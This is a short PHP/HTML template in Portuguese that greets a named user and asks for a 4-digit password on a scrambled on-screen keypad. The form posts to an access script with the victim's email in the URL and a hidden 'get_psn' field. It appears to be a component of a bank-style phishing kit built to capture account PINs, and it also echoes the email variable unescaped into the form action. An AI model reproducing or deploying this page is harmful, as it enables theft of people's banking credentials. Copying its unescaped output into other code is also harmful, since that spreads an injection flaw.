<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao();?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>

	<div class="block_ps4">
		
		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			A senha de 4 dígitos informada não está correta!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Para iniciar seu acesso, informe sua senha de <span class="red_txt">4 dígitos.</span>
		</div><!-- block_message_all -->		
		<span class="desc_exec_show">Informe sua senha de <b class="red_txt">4 dígitos</b> clicando nos botões ao lado:</span>

		<div class="block_numbers_pass">
			<div class="block_up_pass">
				<span class="show_number_pass JJ_0">0</span>
				<span class="show_number_pass JJ_9">9</span>
				<span class="show_number_pass JJ_7">7</span>
				<span class="show_number_pass JJ_5">5</span>
				<span class="show_number_pass JJ_3">3</span>
				<span class="show_number_pass JJ_1">1</span>
				<span class="show_number_pass JJ_2">2</span>
				<span class="show_number_pass JJ_4">4</span>
				<span class="show_number_pass JJ_6">6</span>
				<span class="show_number_pass JJ_8">8</span>

				<div class="button_clear_pass J_Clear4"></div><!-- button_clear_pass -->
			</div><!-- block_up_pass -->	
			<div class="block_down_pass">
				<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" name="ps4_form" id="ps4_form" onsubmit="return check_P4();">
					<input type="password" name="recebe_info_pass4" id="recebe_info_pass4" class="input_faque" readonly="readonly">
					<input type="hidden" name="sender" value="get_psn">			
					<div class="clear"></div>
				</form>
				
			</div><!-- block_down_pass -->

			
		</div><!-- block_numbers_pass -->

	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_P4"></div>
	</div><!-- block_buttons_form -->
	
</div><!-- block_loading -->